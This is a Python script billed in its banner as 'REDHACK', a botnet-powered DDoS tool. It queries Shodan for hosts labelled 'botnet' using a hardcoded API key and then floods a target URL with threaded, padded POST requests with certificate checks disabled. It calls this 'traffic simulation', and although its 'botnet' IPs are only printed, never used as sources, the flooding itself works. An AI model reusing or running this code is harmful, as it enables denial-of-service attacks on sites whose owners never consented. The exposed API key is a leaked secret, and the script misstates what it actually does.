import argparse
import json
import os
import random
import requests
import threading
from flask import Flask
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Suppress SSL warnings
import warnings
from urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

# Global variables
app = Flask(__name__)
BANNER = f'''
{Fore.RED}⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠏⢹⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠀⠈⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣤⣄⣀⣀⣀⣀⣀⣀⣀⣸⣿⠃⠀⠀⠸⣿⣧⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣛⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀⠀⠻⠛⠛⠛⠛⠛⠛⣻⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⣴⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠁⠀⠀⣠⣴⣦⣄⠀⠀⠈⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠃⢀⣴⣾⡿⠋⠛⢿⣷⣤⡀⢹⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣴⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣶⡿⠟⠁⠀⠀⠀⠀⠉⠻⣿⣶⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣦⡤⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⡾⢩⣿⣿⠟⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢌⠻⣿⣷⡌⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⠁⣿⠟⢉⣴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠋⠁⠀⠀⠀⠀⠀⠀⢤⡀⠀⠀⠀⠀⠀⠀⠈⠛⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⣌⠻⣿⡈⣿⣷⣤⡀⠀⠀⠀
⠀⠀⠀⣼⢻⣿⡟⠐⣡⣾⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣷⣮⡁⢹⣿⡇⣷⡀⠀⠀
⠀⠀⣾⡟⢸⣿⣧⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣾⣿⡇⣸⣿⠀⠀
⠀⢰⣿⣧⢸⣿⡿⢋⣴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣀⡀⠀⡀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⣌⠻⣿⡇⣿⣿⡇⠀
⠀⢸⣿⣿⢸⣏⣴⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣷⣌⠃⣿⣿⡇⠀
⢠⠘⣿⣿⢠⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣘⢿⣿⣦⣿⣿⠇⣀
⣸⡀⢻⣿⣾⡿⢣⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡌⠻⣿⣿⡿⢀⣿
⣿⣧⠀⣿⡟⢡⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⠟⠁⠙⢿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣄⠹⣿⠃⣸⣿
⢹⣿⣆⠸⢁⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠁⠀⠀⠀⠀⠙⢿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣆⠛⣰⣿⡿
⠘⣿⣿⡄⣸⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠼⣿⣿⢀⣿⣿⠇
⡆⠹⣿⣷⣿⣿⠁⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣦⡀⠀⠀⠀⢀⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡀⢻⣿⣾⣿⠏⢠
⢻⣄⠙⢿⣿⡇⢀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠹⣿⣿⣿⣦⣀⢀⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠘⣿⡿⠁⣠⣿
⠸⣿⣷⣄⢻⡇⢸⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣿⣿⣿⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⢰⡟⣠⣾⣿⠇
⠀⠹⣿⣿⣦⡀⢸⣿⣿⢸⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣿⡿⠿⠀⠙⠻⣿⣿⣿⣿⣷⣶⣤⣤⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⢸⣿⣿⢠⣾⣿⣿⠋⠀
⠀⠀⣿⠻⣿⣿⣌⣿⣿⠀⢿⣧⠀⠀⠀⠀⠀⣠⣶⣿⣿⡟⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⣰⣿⠁⣼⣿⣣⣿⣿⠟⣱⠆⠀
⠀⠀⠘⣦⡌⠙⢿⣿⣿⡆⢸⣿⣆⠀⠀⠀⢰⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠛⠛⠉⠉⠀⠈⠻⣿⣿⣿⡗⠀⠀⠀⠀⣠⣿⡏⢀⣿⣿⠿⠋⢠⣶⠏⠀⠀
⠀⠀⠀⠘⣿⣷⣤⣈⠛⢷⡈⣿⣿⡶⣄⠀⠘⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠋⠀⠀⠀⣠⢶⣿⣿⠇⠸⢋⣠⣤⣾⡿⠃⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣿⣿⣶⣄⡸⣿⣿⡘⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠃⣼⣿⢏⣠⣶⣿⣿⡿⠛⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢽⠻⢿⣿⣿⣾⣿⣧⡈⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⡿⢃⣼⣿⣿⣿⣿⠿⠛⣩⠆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣤⣀⣉⠉⠛⠛⠂⠛⢿⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⡿⠛⠁⠚⣉⣁⣀⣤⣤⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣷⣾⡿⠿⠿⠛⣒⣠⣤⣶⣶⠶⠶⣶⣤⣴⡶⠶⢶⣶⣶⣦⣜⣛⠛⠿⠿⠷⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢯⣉⣉⠉⠉⢉⣁⣤⣴⣶⣿⣿⣿⠟⠉⣡⣴⡾⠛⠉⠉⠻⢷⣦⣈⠛⢿⣿⣿⣿⣶⣦⣤⣀⣀⣉⣉⣥⣤⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⢿⣿⣿⣿⣿⣿⡿⠟⠋⣀⣴⣿⠟⠁⠀⠀⠀⠀⠀⠀⠙⢿⣷⣄⡈⠛⠻⠿⣿⣿⣿⣿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⣿⢋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡿⠂⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
Version: 1.0
Author: G4UR4V007
REDHACK is a botnet-powered DDoS tool with real-time attack mapping, customizable threads, and packet sizes. Built for impactful traffic simulation.
'''
print(BANNER)
# Configure your Shodan API key here
SHODAN_API_KEY = 'Jvt0B5uZIDPJ5pbCqMo12CqD7pdnMSEd'
SHODAN_API_URL = f'https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query=botnet'

def download_botnets(batch_size=1000):
    """Download botnets from the Shodan API and save to JSON file."""
    botnets = []
    page = 1
    while len(botnets) < batch_size:
        try:
            response = requests.get(SHODAN_API_URL)
            response.raise_for_status()
            data = response.json()
            botnets.extend(data['matches'])
            if len(botnets) >= batch_size:
                break
            page += 1
        except requests.RequestException as e:
            print(f"Error downloading botnets: {e}")
            break

    try:
        with open('botnets.json', 'w') as f:
            json.dump(botnets[:batch_size], f, indent=4)
        print(f"Downloaded {len(botnets)} botnets to 'botnets.json'")
    except IOError as e:
        print(f"Error writing JSON file: {e}")

def load_botnets():
    """Load botnets from the JSON file."""
    try:
        with open('botnets.json') as f:
            data = f.read()
            botnets = json.loads(data)
            return botnets
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON: {e}")
        return []
    except FileNotFoundError:
        print("File not found: botnets.json")
        return []
    except Exception as e:
        print(f"Unexpected error: {e}")
        return []

def send_request(target_url, user_agent, ip, proxy, packet_size):
    """Send a request to the target URL."""
    headers = {'User-Agent': user_agent}
    data = 'X' * packet_size  # Simulate packet size
    
    try:
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        response = requests.post(target_url, headers=headers, data=data, proxies=proxies, verify=False)
        status_code = response.status_code
        status_text = 'OK' if status_code == 200 else 'Other'

        # Print colored output
        if status_code == 200:
            status_color = Fore.BLUE
        elif status_code == 500:
            status_color = Fore.RED
        else:
            status_color = Fore.YELLOW

        print(f"{Fore.GREEN}[*] {ip} {Fore.YELLOW}{user_agent} ==> {status_color}{status_code} {status_text}")

    except requests.RequestException as e:
        print(f"Error simulating traffic from {ip}: {e}")

def simulate_traffic(target_url, num_requests=100, proxy=None, num_threads=1, packet_size=1024):
    """Simulate traffic to the target URL using botnets."""
    botnets = load_botnets()
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
        # Add more user agents if needed
    ]

    def worker():
        for _ in range(num_requests // num_threads):
            if not botnets:
                print("No botnets available. Please download botnets first.")
                return
            botnet = random.choice(botnets)
            ip = botnet.get('ip_str', '0.0.0.0')
            user_agent = random.choice(user_agents)
            send_request(target_url, user_agent, ip, proxy, packet_size)

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

@app.route('/')
def index():
    """Main index route."""
    return "Welcome to the Botnet Traffic Simulator!"

def main():
    parser = argparse.ArgumentParser(description='Botnet Traffic Simulator')
    
    parser.add_argument('-t', '--target', type=str, help='Target URL to simulate traffic on.')
    parser.add_argument('-n', '--num_requests', type=int, default=100, help='Number of requests to simulate (default: 100).')
    parser.add_argument('-p', '--proxy', type=str, help='Proxy server to route requests through (optional).')
    parser.add_argument('-j', '--num_threads', type=int, default=1, help='Number of threads to use (default: 1).')
    parser.add_argument('-s', '--packet_size', type=int, default=1024, help='Size of packets to send (default: 1024).')
    parser.add_argument('--download-botnet', action='store_true', help='Download botnets from Shodan and save to JSON file.')

    args = parser.parse_args()

    # Check if the botnets file already exists
    if args.download_botnet:
        if os.path.exists('botnets.json'):
            print("Botnets already downloaded. Use the existing file for traffic simulation.")
        else:
            download_botnets()
    
    # Check if target URL is provided for traffic simulation
    if args.target:
        simulate_traffic(args.target, args.num_requests, args.proxy, args.num_threads, args.packet_size)

if __name__ == "__main__":
    main()
